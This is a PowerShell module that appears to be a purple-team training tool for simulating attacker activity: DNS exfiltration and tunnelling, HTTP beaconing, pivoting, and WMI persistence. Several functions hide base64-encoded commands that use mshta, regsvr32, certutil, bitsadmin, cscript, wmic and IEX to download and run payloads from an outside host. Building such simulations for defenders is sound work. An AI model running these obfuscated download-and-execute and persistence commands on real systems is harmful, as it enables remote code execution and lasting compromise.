
function New-SimDnsExfil {
    <# 
    .DESCRIPTION
        Simulates Base64-encoded DNS Exfil for training

    .EXAMPLE
        New-SimDnsExfil -Website d111111abcdef8.cloudflare.com -Interval 3 -TotalTime 30

    .NOTES
        Interval time is in seconds
        TotalTime is in minutes
    #>

    Param
    ( 
        [array] $Website,
        [string] $Interval,
        [string] $TotalTime 
    )

    $timeout = New-Timespan -Minutes $TotalTime
    $sw = [Diagnostics.Stopwatch]::StartNew()    
    $ErrorActionPreference = "SilentlyContinue"
    while ($sw.Elapsed -lt $timeout)
    {
        $rname = ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 23  | % {[char]$_}) )
        $rnames = $rname -replace "..$"         
        $rnameb = [System.Text.Encoding]::Unicode.GetBytes($rnames)
        $rname64 = [System.Convert]::ToBase64String($rnameb)
        $rquery = $rname64 + "." + $Website
                
        try {
            [Net.DNS]::GetHostByName($rquery) 
        }
        catch {}
        finally {
            Write-Host -ForegroundColor Green "[+] " -NoNewLine; Write-Host "$(Get-Date -UFormat %H:%M:%S): Sending DNS query for $rquery"
        } 
        Start-Sleep -seconds $Interval
    } 
    Write-Host -ForegroundColor Red "[-] " -NoNewLine; Write-Host "$(Get-Date -UFormat %H:%M:%S): Queries have ended"
}


Function New-SimDnsTunnel {

    <# 
    .DESCRIPTION
        Simulates cmd.exe tunneled over DNS for training

    .EXAMPLE
        New-SimDnsTunnel -Website cloudflare.com -Interval 3 -TotalTime 10

    .NOTES
        Interval time is in seconds
        TotalTime is in minutes
   #>


    Param( 
        $Website, 
        $Interval, 
        $TotalTime 
    )


    $timeout = New-Timespan -Minutes $TotalTime
    $sw = [diagnostics.stopwatch]::StartNew()    
    while ($sw.elapsed -lt $timeout) {
        $random = "testquery.$(get-random -minimum 100000000000000 -maximum 999999999999999).$Website"    
        try {
            [Net.DNS]::GetHostByName($random) 2>$null
        }
        catch {
            Write-Host -ForegroundColor Green "[+] " -NoNewLine; Write-Host "$(Get-Date -UFormat %H:%M:%S): Sending DNS query for: $random"
        } 
        Start-Sleep -seconds $Interval
    } 
    Write-Host -ForegroundColor Red "[-] " -NoNewLine; Write-Host "$(Get-Date -UFormat %H:%M:%S): Queries have ended"
}


function New-SimPivotAttempts {

    <# 
    .DESCRIPTION
        Simulates pivoting techniques for training

    .EXAMPLE
        New-SimPivotAttempts -Systemlist c:\hosts.txt -Interval 3 -TotalTime 30

    .NOTES
        Interval time is in seconds
        TotalTime is in minutes
    #>

    Param ( 
        [string] $Systemlist,
        [string] $Interval,
        [string] $TotalTime 
    )

    $timeout = New-Timespan -Minutes $TotalTime
    $sw = [Diagnostics.Stopwatch]::StartNew()
    while ($sw.elapsed -lt $timeout)
    {        
        Get-Content $Systemlist | Foreach { 
            Invoke-Command -Scriptblock {hostname} -computer $_
            Write-Host -ForegroundColor Cyan "[+] " -NoNewLine; Write-Host "$(Get-Date -UFormat %H:%M:%S):  Result:$status"
            Start-Sleep -seconds $Interval
        }
    }
}


Function New-SimHttpBeacon {

    <# 
    .DESCRIPTION
        Simulates beaconing techniques for training

    .EXAMPLE
        New-SimBeacon -Website www.sans.org -Interval 3 -TotalTime 30

    .NOTES
        Interval time is in seconds
        TotalTime is in minutes
    #>

    Param ( 
        $Website, 
        $Interval, 
        $TotalTime 
    )

    $timeout = New-Timespan -Minutes $TotalTime
    $sw = [diagnostics.stopwatch]::StartNew()
    while ($sw.elapsed -lt $timeout)
    {
        $random = Get-Random -minimum 100000000000000 -maximum 999999999999999
        $status = (Invoke-WebRequest $Website -proxy "http://10.10.10.10" -useragent "Mozilla/5.0 (Windows NT 6.1; xxxxxxx; rv:11.0) TEST-$random").StatusCode
        Write-Host -Fore Green "[+] " -NoNewLine; Write-Host "$(Get-Date -UFormat %H:%M:%S)  ----  $Website  ----  Status: $status  ----  Beacon still alive!"
        Start-Sleep -seconds $Interval
    } 
    Write-Host -Fore Red "[-] " -NoNewLine; Write-Host "$(Get-Date -UFormat %H:%M:%S)  ----  $Website  ----  Status: ---  ----  Beacon is dead."
}


function New-SimWmiPersistence {
    <#
    .EXAMPLE
       New-SimWmiPersistence -set -name Test -hour 09 -minute 15 
       New-SimWmiPersistence -remove -name Test 
       New-SimWmiPersistence -detect -name Test

    .SYNOPSIS
    Set, Remove, or Detect Time-based WMI Persistence

    .DESCRIPTION
    The -set switch is used to create the three components needed for WMI persistence:

        - a WMI event filter which is a condition used to trigger (system time)
        - a consumer or persistence payload
        - a binding which associates the filter to the consumer

    If the -detect switch is used, the persistence components are searched for and displayed.
    If the -remove switch is used, the persistence components are removed.
    #>

    param (
        [string]$Name,
        [string]$Hour,
        [string]$Minute,
        [string]$payload,
        [switch]$detect,
        [switch]$remove,
        [switch]$set
    )

    function checkargs{
        if ($set){
            if (!($Name -and $Hour -and -$Minute)){
            Write-Host "`nWhen setting persistence, you must enter a name, hour, and minute:      Test-WMIPersistence -set -name Test -hour 09 -minute 15`n"
            Exit
            }
        }

        if ($Hour){
            if ((!(($Hour.ToString()).length -eq 2))){
                Write-Host "`nYou must enter hours using two digit format:   09 for 9:00 AM, 14 for 2:00 PM`n"
                exit
            }
        }
        if ($Minute){
            if ((!(($Minute.ToString()).length -eq 2))){
                Write-Host "`nYou must enter minutes using two digit format:   55 for 09:55, 15 for 10:15`n"
                exit
            }
        }
        if (!($set -or $detect -or $remove)){
            Write-Host "`nYou must choose to either set (-set), detect (-detect), or remove (-remove) persistence`n"
            exit
        }
    }

    function Set-Persistence
    {
        # $payload = 'C:\Windows\System32\calc.exe'
        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=`"$hour`" AND `
                TargetInstance.Minute=`"$minute`" GROUP WITHIN 60" 
        
        $FilterArgs = @{
            Name=$Name;
            EventNameSpace="root\cimv2";
            QueryLanguage="WQL";
            Query=$Query
        }
        $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments $FilterArgs -Erroraction Stop
        
        Write-Host -Fore Green "Event Filter created:" -NoNewline; Write-Host "      $name"
        $ConsumerArgs = @{
                Name=$Name;
                ExecutablePath=$payload;
                CommandLineTemplate=$payload
        }
        $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs 

        Write-Host -Fore Green "Event Consumer created:" -NoNewline; Write-Host "    $name"

        $BindingArgs = @{
            Filter=$WMIEventFilter;
            Consumer=$WMIEventConsumer
        }
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $BindingArgs | Out-Null

        Write-Host -Fore Green "Binding created:" -NoNewline; Write-Host "           $name"
    }

    function Remove-Persistence
    {
        gwmi -namespace "root\subscription" -class __EventFilter | ? name -eq "$Name" | Remove-WMIObject
        Write-Host -Fore Green "Event Filter removed:" -NoNewline; Write-Host "      $name"

        gwmi -namespace "root\subscription" -class CommandLineEventConsumer | ? name -eq "$Name" | Remove-WMIObject
        Write-Host -Fore Green "Event Consumer removed:" -NoNewline; Write-Host "    $name"
        
        gwmi -namespace "root\subscription" -class __FilterToConsumerBinding | ? __RELPATH -match "$Name" | Remove-WMIObject
        Write-Host -Fore Green "Binding removed:" -NoNewline; Write-Host "           $name"
    }

    function Detect-Persistence
    {
        $e = gwmi -namespace "root\subscription" -class __EventFilter | ? name -eq "$Name" | select name,query | fl
        $c = gwmi -namespace "root\subscription" -class CommandLineEventConsumer | ? name -eq "$Name" | select Name,ExecutablePath | fl
        $b = gwmi -namespace "root\subscription" -class __FilterToConsumerBinding | ? __RELPATH -match "$Name" | select Consumer,Filter | fl
        
        if ($e){Write-Host -Fore Green "`n`nEvent Filter details:" $e }
        else{  Write-Host -Fore Yellow "`n`nNo Event Filters found" }  

        if ($c){ Write-Host -Fore Green "Event Consumer details:" $c }
        else{ Write-Host -Fore Yellow "No Consumer Filters found" }  

        if ($b){ Write-Host -Fore Green "Binding details:" $b }
        else{  Write-Host -Fore Yellow "No Bindings found`n" }  
    }


    checkargs

    if ($detect){
        Detect-Persistence
    }

    if ($remove){
        Remove-Persistence
    }

    if ($set){
        Set-Persistence
    }
}




function New-SimMshta {
    powershell -enc YwBtAGQAIAAvAGMAIABtAHMAaAB0AGEAIABoAHQAdABwAHMAOgAvAC8AcwAzAC4AYQBtAGEAegBvAG4AYQB3AHMALgBjAG8AbQAvAGUAeABlAHIAYwBpAHMAZQAtAHAAYwBhAHAALQBkAG8AdwBuAGwAbwBhAGQALQBsAGkAbgBrAC8AcABhAHkAbABvAGEAZAAuAGgAdABhAA==
}

function New-SimRegsvr32 {
    powershell -enc YwBtAGQAIAAvAGMAIAByAGUAZwBzAHYAcgAzADIAIAAvAHMAIAAvAHUAIAAvAG4AIAAvAGkAOgBoAHQAdABwAHMAOgAvAC8AcwAzAC4AYQBtAGEAegBvAG4AYQB3AHMALgBjAG8AbQAvAGUAeABlAHIAYwBpAHMAZQAtAHAAYwBhAHAALQBkAG8AdwBuAGwAbwBhAGQALQBsAGkAbgBrAC8AcABhAHkAbABvAGEAZABWAC4AcwBjAHQAIABzAGMAcgBvAGIAagAuAGQAbABsAA==
}

function New-SimCertUtil {
    powershell -enc YwBtAGQAIAAvAGMAIABjAGUAcgB0AHUAdABpAGwAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AcwBwAGwAaQB0ACAALQBmACAAaAB0AHQAcABzADoALwAvAHMAMwAuAGEAbQBhAHoAbwBuAGEAdwBzAC4AYwBvAG0ALwBlAHgAZQByAGMAaQBzAGUALQBwAGMAYQBwAC0AZABvAHcAbgBsAG8AYQBkAC0AbABpAG4AawAvAEcAbwBUAGUAYQBtAC4AZQB4AGUAIABgACYAIABHAG8AVABlAGEAbQAuAGUAeABlAA==
}

function New-SimCertUtilB64 {
    powershell -enc YwBtAGQAIAAvAGMAIABjAGUAcgB0AHUAdABpAGwAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AcwBwAGwAaQB0ACAALQBmACAAaAB0AHQAcABzADoALwAvAHMAMwAuAGEAbQBhAHoAbwBuAGEAdwBzAC4AYwBvAG0ALwBlAHgAZQByAGMAaQBzAGUALQBwAGMAYQBwAC0AZABvAHcAbgBsAG8AYQBkAC0AbABpAG4AawAvAEcAbwBUAGUAYQBtAC4AYgA2ADQAIABHAG8AVABlAGEAbQAuAGIANgA0ACAAYAAmACAAYwBlAHIAdAB1AHQAaQBsACAALQBkAGUAYwBvAGQAZQAgAEcAbwBUAGUAYQBtAC4AYgA2ADQAIABHAG8AVABlAGEAbQAuAGUAeABlACAAYAAmACAARwBvAFQAZQBhAG0ALgBlAHgAZQA=
}

function New-SimBitsAdmin {
    powershell -enc YwBtAGQAIAAvAGMAIABiAGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByACAAbQB5AGoAbwBiACAALwBkAG8AdwBuAGwAbwBhAGQAIAAvAHAAcgBpAG8AcgBpAHQAeQAgAGgAaQBnAGgAIABoAHQAdABwAHMAOgAvAC8AcwAzAC4AYQBtAGEAegBvAG4AYQB3AHMALgBjAG8AbQAvAGUAeABlAHIAYwBpAHMAZQAtAHAAYwBhAHAALQBkAG8AdwBuAGwAbwBhAGQALQBsAGkAbgBrAC8ARwBvAFQAZQBhAG0ALgBlAHgAZQAgACUAQQBQAFAARABBAFQAQQAlAFwARwBvAFQAZQBhAG0ALgBlAHgAZQAgAGAAJgAgAHMAdABhAHIAdAAgACUAQQBQAFAARABBAFQAQQAlAFwARwBvAFQAZQBhAG0ALgBlAHgAZQA=
}

function New-SimPsIex {
    powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQB4AGUAYwAgAGIAeQBwAGEAcwBzACAALQBjACAAIgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAPQBbAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7AGkAdwByACgAYAAiAGgAdAB0AHAAOgAvAC8AdwBlAGIAcwBlAHIAdgBlAHIALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAYAAiACkAfABpAGUAeAAiAA==
}

function New-SimPsDownloadFile {
    powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcABzADoALwAvAHMAMwAuAGEAbQBhAHoAbwBuAGEAdwBzAC4AYwBvAG0ALwBlAHgAZQByAGMAaQBzAGUALQBwAGMAYQBwAC0AZABvAHcAbgBsAG8AYQBkAC0AbABpAG4AawAvAEcAbwBUAGUAYQBtAC4AZQB4AGUAIgAsACIAYQAuAGUAeABlACIAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAiAGEALgBlAHgAZQAiAA==
}

function New-SimCscript {
    powershell -enc YwBtAGQAIAAvAGMAIAAiAEAAZQBjAGgAbwAgAFMAZQB0ACAAbwBiAGoAWABNAEwASABUAFQAUAA9AEMAcgBlAGEAdABlAE8AYgBqAGUAYwB0ACgAYAAiAE0AUwBYAE0ATAAyAC4AWABNAEwASABUAFQAUABgACIAKQA+AGcAdAAuAHYAYgBzACYAQABlAGMAaABvACAAbwBiAGoAWABNAEwASABUAFQAUAAuAG8AcABlAG4AIABgACIARwBFAFQAYAAiACwAYAAiAGgAdAB0AHAAcwA6AC8ALwBzADMALgBhAG0AYQB6AG8AbgBhAHcAcwAuAGMAbwBtAC8AZQB4AGUAcgBjAGkAcwBlAC0AcABjAGEAcAAtAGQAbwB3AG4AbABvAGEAZAAtAGwAaQBuAGsALwBHAG8AVABlAGEAbQAuAGUAeABlAGAAIgAsAGYAYQBsAHMAZQA+AD4AZwB0AC4AdgBiAHMAJgBAAGUAYwBoAG8AIABvAGIAagBYAE0ATABIAFQAVABQAC4AcwBlAG4AZAAoACkAPgA+AGcAdAAuAHYAYgBzACYAQABlAGMAaABvACAASQBmACAAbwBiAGoAWABNAEwASABUAFQAUAAuAFMAdABhAHQAdQBzAD0AMgAwADAAIABUAGgAZQBuAD4APgBnAHQALgB2AGIAcwAmAEAAZQBjAGgAbwAgAFMAZQB0ACAAbwBiAGoAQQBEAE8AUwB0AHIAZQBhAG0APQBDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAoAGAAIgBBAEQATwBEAEIALgBTAHQAcgBlAGEAbQBgACIAKQA+AD4AZwB0AC4AdgBiAHMAJgBAAGUAYwBoAG8AIABvAGIAagBBAEQATwBTAHQAcgBlAGEAbQAuAE8AcABlAG4APgA+AGcAdAAuAHYAYgBzACYAQABlAGMAaABvACAAbwBiAGoAQQBEAE8AUwB0AHIAZQBhAG0ALgBUAHkAcABlAD0AMQAgAD4APgBnAHQALgB2AGIAcwAmAEAAZQBjAGgAbwAgAG8AYgBqAEEARABPAFMAdAByAGUAYQBtAC4AVwByAGkAdABlACAAbwBiAGoAWABNAEwASABUAFQAUAAuAFIAZQBzAHAAbwBuAHMAZQBCAG8AZAB5AD4APgBnAHQALgB2AGIAcwAmAEAAZQBjAGgAbwAgAG8AYgBqAEEARABPAFMAdAByAGUAYQBtAC4AUABvAHMAaQB0AGkAbwBuAD0AMAAgAD4APgBnAHQALgB2AGIAcwAmAEAAZQBjAGgAbwAgAG8AYgBqAEEARABPAFMAdAByAGUAYQBtAC4AUwBhAHYAZQBUAG8ARgBpAGwAZQAgAGAAIgBhAC4AZQB4AGUAYAAiAD4APgBnAHQALgB2AGIAcwAmAEAAZQBjAGgAbwAgAG8AYgBqAEEARABPAFMAdAByAGUAYQBtAC4AQwBsAG8AcwBlAD4APgBnAHQALgB2AGIAcwAmAEAAZQBjAGgAbwAgAFMAZQB0ACAAbwBiAGoAQQBEAE8AUwB0AHIAZQBhAG0APQBOAG8AdABoAGkAbgBnAD4APgBnAHQALgB2AGIAcwAmAEAAZQBjAGgAbwAgAEUAbgBkACAAaQBmAD4APgBnAHQALgB2AGIAcwAmAEAAZQBjAGgAbwAgAFMAZQB0ACAAbwBiAGoAWABNAEwASABUAFQAUAA9AE4AbwB0AGgAaQBuAGcAPgA+AGcAdAAuAHYAYgBzACYAQABlAGMAaABvACAAUwBlAHQAIABvAGIAagBTAGgAZQBsAGwAPQBDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAoAGAAIgBXAFMAYwByAGkAcAB0AC4AUwBoAGUAbABsAGAAIgApAD4APgBnAHQALgB2AGIAcwAmAEAAZQBjAGgAbwAgAG8AYgBqAFMAaABlAGwAbAAuAEUAeABlAGMAKABgACIAYQAuAGUAeABlAGAAIgApAD4APgBnAHQALgB2AGIAcwAmAGMAcwBjAHIAaQBwAHQALgBlAHgAZQAgAGcAdAAuAHYAYgBzACIA
}

function New-SimWmic {
    powershell -enc YwBtAGQAIAAvAGMAIAAiAHcAbQBpAGMAIABvAHMAIABnAGUAdAAgAC8AZgBvAHIAbQBhAHQAOgBgACIAaAB0AHQAcABzADoALwAvAHMAMwAuAGEAbQBhAHoAbwBuAGEAdwBzAC4AYwBvAG0ALwBlAHgAZQByAGMAaQBzAGUALQBwAGMAYQBwAC0AZABvAHcAbgBsAG8AYQBkAC0AbABpAG4AawAvAHAAYQB5AGwAbwBhAGQALgB4AHMAbABgACIAIgA=
}

# Export these functions
$funcs =  @('New-SimBitsAdmin'
            'New-SimCertUtil'
            'New-SimCertUtilB64'
            'New-SimCscript'
            'New-SimDnsExfil'
            'New-SimDnsTunnel'
            'New-SimHttpBeacon'
            'New-SimMshta'
            'New-SimPivotAttempts'
            'New-SimPsDownloadFile'
            'New-SimPsIex'
            'New-SimRegsvr32'
            'New-SimWmic'
            'New-SimWmiPersistence')

Export-ModuleMember -Function $funcs
